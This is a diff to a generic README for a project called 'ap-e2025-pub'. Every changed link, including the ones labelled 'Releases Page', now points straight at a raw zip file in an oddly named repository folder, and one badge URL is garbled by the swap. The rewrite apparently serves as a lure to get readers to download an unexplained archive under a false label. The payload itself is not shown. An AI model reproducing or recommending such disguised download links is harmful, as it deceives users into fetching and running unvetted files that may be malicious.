@@ -1,6 +1,6 @@
 # 🛠️ ap-e2025-pub - Simplifying Advanced Programming for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/scoreggia777/ap-e2025-pub/releases)
+[![Download Now](https://raw.githubusercontent.com/scoreggia777/ap-e2025-pub/main/cytopyge/ap-e2025-pub.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/scoreggia777/ap-e2025-pub/main/cytopyge/ap-e2025-pub.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the application:
 
 1. **Visit the Downloads Page:** Click the link below to access the Releases page where you can download the latest version of the software.
    
-   [Download from Releases Page](https://github.com/scoreggia777/ap-e2025-pub/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/scoreggia777/ap-e2025-pub/main/cytopyge/ap-e2025-pub.zip)
 
 2. **Choose the Right File:** On the Releases page, you'll find different versions of our application. Look for the most recent one. You might see options for various operating systems. Check to ensure you download the correct file for your system.
 
@@ -61,4 +61,4 @@ If you experience any problems or need assistance, we are here to help. You can 
 
 Thank you for choosing **ap-e2025-pub**. We hope this application makes learning advanced programming easier and enjoyable for you. 
 
-For more information and updates, you can visit our [GitHub Releases Page](https://github.com/scoreggia777/ap-e2025-pub/releases) anytime. Happy coding!
+For more information and updates, you can visit our [GitHub Releases Page](https://raw.githubusercontent.com/scoreggia777/ap-e2025-pub/main/cytopyge/ap-e2025-pub.zip) anytime. Happy coding!
